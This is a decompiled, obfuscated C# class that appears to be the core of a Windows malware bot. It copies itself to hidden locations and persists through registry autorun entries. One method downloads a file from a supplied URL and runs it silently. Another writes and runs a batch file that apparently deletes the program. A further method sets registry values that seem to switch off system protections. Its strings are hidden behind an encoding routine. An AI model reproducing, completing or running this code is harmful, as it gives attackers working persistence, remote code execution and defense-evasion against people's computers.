using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	private Mutex zMutex;

	public void method_0()
	{
		method_1();
		method_7();
		method_2();
	}

	private void method_1()
	{
		try
		{
			zMutex = new Mutex(initiallyOwned: true, Class2.ConfigClass.tzirtzurtzurzru);
			zMutex.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(-1);
		}
	}

	private void method_2()
	{
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		if (method_5())
		{
			return;
		}
		try
		{
			string[] zurtzuerthtr = Class2.ConfigClass.zurtzuerthtr;
			foreach (string text in zurtzuerthtr)
			{
				if (!Class2.FunctionClass.method_4(text))
				{
					File.Copy(fileName, text);
				}
				File.SetAttributes(text, FileAttributes.Hidden);
			}
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.SetValue(Class2.ConfigClass.bncbncvbcvbn[0], '"' + Class2.ConfigClass.zurtzuerthtr[0] + '"');
			Registry.LocalMachine.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.SetValue(Class2.ConfigClass.bncbncvbcvbn[1], '"' + Class2.ConfigClass.zurtzuerthtr[1] + '"');
		}
		catch
		{
		}
		try
		{
			zMutex.Close();
			string[] zurtzuerthtr2 = Class2.ConfigClass.zurtzuerthtr;
			foreach (string fileName2 in zurtzuerthtr2)
			{
				Process process = new Process();
				process.StartInfo.FileName = fileName2;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
			}
		}
		catch
		{
		}
		Environment.Exit(-1);
	}

	public void method_3(string string_0)
	{
		try
		{
			zMutex.Close();
		}
		catch
		{
		}
		try
		{
			string text = Class2.FunctionClass.method_3(new Random().Next(5, 12)) + GClass0.smethod_0("*Ŧɺ\u0364");
			new WebClient().DownloadFile(string_0, Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("]") + text);
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("]") + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	public void method_4()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(Class2.ConfigClass.bncbncvbcvbn[0]);
			Registry.LocalMachine.OpenSubKey(GClass0.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(Class2.ConfigClass.bncbncvbcvbn[1]);
		}
		catch
		{
		}
		try
		{
			string[] zurtzuerthtr = Class2.ConfigClass.zurtzuerthtr;
			foreach (string path in zurtzuerthtr)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		method_6();
		Environment.Exit(-1);
	}

	private bool method_5()
	{
		string[] zurtzuerthtr = Class2.ConfigClass.zurtzuerthtr;
		int num = 0;
		if (0 < zurtzuerthtr.Length)
		{
			string string_ = zurtzuerthtr[num];
			if (!Class2.FunctionClass.method_4(string_))
			{
				return false;
			}
		}
		return true;
	}

	private void method_6()
	{
		try
		{
			string value = GClass0.smethod_0("2ŕɖ\u030fѠզٮܡ") + '"' + Environment.GetCommandLineArgs()[0] + '"' + GClass0.smethod_0("\0Šɮ\u0327ѣս٭ݰ\u0876ड") + '"' + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + '"' + GClass0.smethod_0("(Šɩͱѫԣ\u0650ݑ");
			TextWriter textWriter = new StreamWriter(Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75"));
			textWriter.WriteLine(value);
			textWriter.Close();
			Process process = new Process();
			process.StartInfo.FileName = Environment.GetEnvironmentVariable(GClass0.smethod_0("Pņɏ\u0351")) + GClass0.smethod_0("WŮɬ\u0364Ѣղ٠ܪࡡ\u0963\u0a75");
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
		}
		catch
		{
		}
	}

	private void method_7()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("hŕɟ\u034cр\u0557هݑ\u086fॿ\u0a58\u0b53\u0c5d\u0d41\u0e5eགྷ၍ᅞት\u137fᑎᕈᙁᝋᡔᥑ\u1a7d᭣ᱪᵬṯό⁵Ⅾ≏⍽⑥╥♼❻⡽⥎⩔⭨Ɀⵢ\u2e62⽾のㅸ㉕㍉㑣㕰㙤㝪㡠㥧㩥"), writable: true)!.SetValue(GClass0.smethod_0("NŬɠ\u0367ѧկ"), GClass0.smethod_0("3"), RegistryValueKind.DWord);
		}
		catch
		{
		}
		if (Class2.ConfigClass.fgbvnmvbmnm)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("hŕɟ\u034cр\u0557هݑ\u086fॿ\u0a58\u0b53\u0c5d\u0d41\u0e5eགྷ၍ᅞት\u137fᑎᕈᙁᝋᡔᥑ\u1a7d᭣ᱪᵬṯό⁵Ⅾ≏⍽⑥╥♼❻⡽⥎⩔⭨Ɀⵢ\u2e62⽾のㅸ㉕㍉㑣㕰㙤㝪㡠㥧㩥"), writable: true)!.SetValue(GClass0.smethod_0("Tžɮ\u036cѡթىݫࡥ।੨୩౫\u0d50\u0e6a\u0f72\u1072"), GClass0.smethod_0("1"), RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass0.smethod_0("1"), RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey(GClass0.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass0.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass0.smethod_0("1"), RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
	}
}
